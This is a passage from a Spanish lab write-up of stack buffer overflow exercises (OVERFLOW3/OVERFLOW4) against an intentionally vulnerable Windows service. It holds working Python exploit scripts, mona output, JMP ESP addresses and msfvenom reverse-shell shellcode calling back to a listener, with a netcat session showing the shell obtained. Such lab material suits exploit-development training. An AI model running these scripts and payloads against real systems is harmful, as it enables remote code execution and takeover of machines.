\u0026#34;\\xc6\\x15\\x3a\\xc2\\x0b\\x13\\xf4\\x79\\xff\\xef\\x07\\xab\\x31\\x0f\\xab\u0026#34; \u0026#34;\\x92\\xfd\\xe2\\xb5\\xd3\\x3a\\x1d\\xc0\\x2d\\x39\\xa0\\xd3\\xea\\x43\\x7e\u0026#34; \u0026#34;\\x51\\xe8\\xe4\\xf5\\xc1\\xd4\\x15\\xd9\\x94\\x9f\\x1a\\x96\\xd3\\xc7\\x3e\u0026#34; \u0026#34;\\x29\\x37\\x7c\\x3a\\xa2\\xb6\\x52\\xca\\xf0\\x9c\\x76\\x96\\xa3\\xbd\\x2f\u0026#34; \u0026#34;\\x72\\x05\\xc1\\x2f\\xdd\\xfa\\x67\\x24\\xf0\\xef\\x15\\x67\\x9d\\xdc\\x17\u0026#34; \u0026#34;\\x97\\x5d\\x4b\\x2f\\xe4\\x6f\\xd4\\x9b\\x62\\xdc\\x9d\\x05\\x75\\x23\\xb4\u0026#34; \u0026#34;\\xf2\\xe9\\xda\\x37\\x03\\x20\\x19\\x63\\x53\\x5a\\x88\\x0c\\x38\\x9a\\x35\u0026#34; \u0026#34;\\xd9\\xef\\xca\\x99\\xb2\\x4f\\xba\\x59\\x63\\x38\\xd0\\x55\\x5c\\x58\\xdb\u0026#34; \u0026#34;\\xbf\\xf5\\xf3\\x26\\x28\\x3a\\xab\\x3e\\xa9\\xd2\\xae\\x3e\\xac\\x18\\x26\u0026#34; \u0026#34;\\xd8\\xc4\\x4c\\x6e\\x73\\x71\\xf4\\x2b\\x0f\\xe0\\xf9\\xe1\\x6a\\x22\\x71\u0026#34; \u0026#34;\\x06\\x8b\\xed\\x72\\x63\\x9f\\x9a\\x72\\x3e\\xfd\\x0d\\x8c\\x94\\x69\\xd1\u0026#34; \u0026#34;\\x1f\\x73\\x69\\x9c\\x03\\x2c\\x3e\\xc9\\xf2\\x25\\xaa\\xe7\\xad\\x9f\\xc8\u0026#34; \u0026#34;\\xf5\\x28\\xe7\\x48\\x22\\x89\\xe6\\x51\\xa7\\xb5\\xcc\\x41\\x71\\x35\\x49\u0026#34; \u0026#34;\\x35\\x2d\\x60\\x07\\xe3\\x8b\\xda\\xe9\\x5d\\x42\\xb0\\xa3\\x09\\x13\\xfa\u0026#34; \u0026#34;\\x73\\x4f\\x1c\\xd7\\x05\\xaf\\xad\\x8e\\x53\\xd0\\x02\\x47\\x54\\xa9\\x7e\u0026#34; \u0026#34;\\xf7\\x9b\\x60\\x3b\\x17\\x7e\\xa0\\x36\\xb0\\x27\\x21\\xfb\\xdd\\xd7\\x9c\u0026#34; \u0026#34;\\x38\\xd8\\x5b\\x14\\xc1\\x1f\\x43\\x5d\\xc4\\x64\\xc3\\x8e\\xb4\\xf5\\xa6\u0026#34; \u0026#34;\\xb0\\x6b\\xf5\\xe2\\xb0\\x8b\\x09\\x0d\u0026#34;) eip_ret = pack(\u0026#34;\u0026lt;L\u0026#34;,0x62501203) nops = \u0026#34;\\x90\u0026#34; * 16 padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1274 + eip_ret + nops + shellcode + padding * (1750 - 1274 - 4 - 16 - 353) try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW3 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Tras ejecutar el script logramos obtener una shell.\n1 2 3 4 5 6 7 8 9 10 11 ➜ OVERFLOW_3 nc -lvnp 1338 Listening on 0.0.0.0 1338 Connection received on 192.168.22.128 49181 Microsoft Windows [Versin 6.1.7601] Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos. C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\u0026gt;echo %username% echo %username% sckull C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\u0026gt; Overflow 4 Fuzzing Realizamos fuzzing al segundo reto utilizando esta vez OVERFLOW4.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #!/usr/bin/python2.7 import socket, sys from pwn import * from struct import pack if len(sys.argv) != 2: print(\u0026#34;[*] Run:\\n\\toscp1.py \u0026lt;IP-address\u0026gt;\u0026#34;) sys.exit(1) address = sys.argv[1] port = 1337 buff = [\u0026#34;A\u0026#34;] c = 100 while len(buff) \u0026lt; 30: buff.append(\u0026#34;A\u0026#34;*c) c += 100 p1 = log.progress(\u0026#34;Progreso\u0026#34;) for string in buff: try: p1.status(\u0026#34;Enviando %s bytes.\u0026#34; % len(string)) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW4 %s\\r\\n\u0026#34; % string) s.close() #log.info(\u0026#34;x_x socket.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo con %s bytes.\u0026#34; % len(string)) sys.exit(1) Encontramos que el programa se detuvo con 2200 bytes.\n1 2 3 4 ➜ OVERFLOW_4 ./overflow4.py 192.168.22.128 [p] Progreso: Enviando 2200 bytes. [-] Parece que el programa se detuvo con 2200 bytes. ➜ OVERFLOW_4 Observamos que el registro EIP se sobreescribió con “A\u0026quot;s, tambien vemos el registro ESP con los mismos valores.\nOffset EIP Creamos un patron de 2500 bytes utilizando pattern_create.rb.\n1 2 3 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ ./pattern_create.rb -l 2500 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D Modificamos el script para realizar el envio de este.\n1 2 3 4 5 6 7 8 9 10 11 12 13 buff = \u0026#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D\u0026#34; try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW4 %s\\r\\n\u0026#34; % buff) s.close() #log.info(\u0026#34;x_x socket.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34;) El registro EIP está lleno con el patron enviado asi mismo el registro ESP.\nMona nos muestra el offset con valor de 2026 bytes.\n1 2 3 4 5 6 7 8 9 10 11 # !mona findmsp -distance 2500 [+] Command used: !mona findmsp -distance 2500 [+] Looking for cyclic pattern in memory [..] [+] Examining registers EIP contains normal pattern : 0x70433570 (offset 2026) ESP (0x0181fa30) points at offset 2030 in normal pattern (length 470) EBP contains normal pattern : 0x43347043 (offset 2022) EBX contains normal pattern : 0x33704332 (offset 2018) Control EIP Utilizando la longitud del offset agregamos “B\u0026quot;s para confirmar que el offset es exacto y que tenemos el control del registro EIP, además agregamos un padding para mantener la longitud del buffer (2500).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 2026 + eip_ret + nops + padding * (2500-2026-4) # junk 2026, eip 4, padding 470 = 2500 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW4 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Tras ejecutar el script vemos que el registro EIP contiene “B\u0026quot;s lo que significa que el offset es exacto, además vemos el registro ESP con el padding (“C\u0026quot;s).\nEspacio - Shellcode Aumentamos el padding para tener asegurado un espacio ‘decente’ para nuestro shellcode, en este caso 50 bytes adicionales, en total tendríamos 504 bytes disponibles.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; # 16 bytes padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 2026 + eip_ret + nops + padding * (2500 - 2026 - 4 - 16 + 50) # 504 padding # 2026 junk, 4 eip_ret, padding 504 (shellcode + nops) # total buffer = 2534 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW4 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) El debugger muestra el mismo comportamiento por lo que tomamos la longitud del buffer en 2534 bytes de los cuales 504 bytes serán para el shellcode y los nops (16 bytes).\nBadChars Generamos con mona un array con todos los badchars exeptuando el valor null (\\x00).\n1 !mona bytearray -cpb \u0026#34;\\x00\u0026#34; Modificamos el script con nuestro array de badchars.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 badchars = (\u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; \u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; \u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; \u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; \u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; \u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; \u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; \u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34;) eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; # 16 bytes padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 2026 + eip_ret + nops + badchars + padding * (2500 - 2026 - 4 - 250) # 504 padding try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW4 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Realizamos la busqueda de badchars como en el primer reto. Inicialmente encontramos los badchars \u0026quot;\\x00\\xa9\\xcd\\xd4\u0026quot;.\n1 \\x00\\xa9\\xcd\\xd4 JMP ESP Buscamos una instrucción de salto al ESP con mona.\n1 2 !mona find -s \u0026#39;jmp esp\u0026#39; -type instr -cm aslr=false,rebase=false,nx=false -cpb \u0026#34;\\x00\\xa9\\xcd\\xd4\u0026#34; !mona jmp -r esp -cpb \u0026#34;\\x00\\xa9\\xcd\\xd4\u0026#34; Encontramos dos direcciones de memoria con la instrucción jmp esp sin ningun tipo de protección.\n1 2 3 4 5 6 7 8 9 10 11 12 13 [+] Command used: !mona find -s \u0026#39;jmp esp\u0026#39; -type instr -cm aslr=false,rebase=false,nx=false -cpb \u0026#34;\\x00\\xa9\\xcd\\xd4\u0026#34; [+] Results : 0x625011af : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011bb : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011c7 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011d3 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011df : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011eb : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011f7 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x62501203 : \u0026#39;jmp esp\u0026#39; | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x62501205 : \u0026#39;jmp esp\u0026#39; | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) Found a total of 9 pointers Modificamos nuestr script agregando la dirección de la instrucción.\n1 2 3 from struct import pack eip_ret = pack(\u0026#34;\u0026lt;L\u0026#34;,0x625011af) Shellcode Creamos nuestro shellcode pasandole los badchars que encontramos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.22.1 LPORT=1338 -a x86 --platform windows -f c -b \u0026#34;\\x00\\xa9\\xcd\\xd4\u0026#34; 127 ⨯ Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 351 (iteration=0) x86/shikata_ga_nai chosen with final size 351 Payload size: 351 bytes Final size of c file: 1500 bytes unsigned char buf[] = \u0026#34;\\xba\\x6d\\xb5\\x70\\xc4\\xda\\xc3\\xd9\\x74\\x24\\xf4\\x5e\\x2b\\xc9\\xb1\u0026#34; \u0026#34;\\x52\\x31\\x56\\x12\\x03\\x56\\x12\\x83\\x83\\x49\\x92\\x31\\xa7\\x5a\\xd1\u0026#34; \u0026#34;\\xba\\x57\\x9b\\xb6\\x33\\xb2\\xaa\\xf6\\x20\\xb7\\x9d\\xc6\\x23\\x95\\x11\u0026#34; \u0026#34;\\xac\\x66\\x0d\\xa1\\xc0\\xae\\x22\\x02\\x6e\\x89\\x0d\\x93\\xc3\\xe9\\x0c\u0026#34; \u0026#34;\\x17\\x1e\\x3e\\xee\\x26\\xd1\\x33\\xef\\x6f\\x0c\\xb9\\xbd\\x38\\x5a\\x6c\u0026#34; 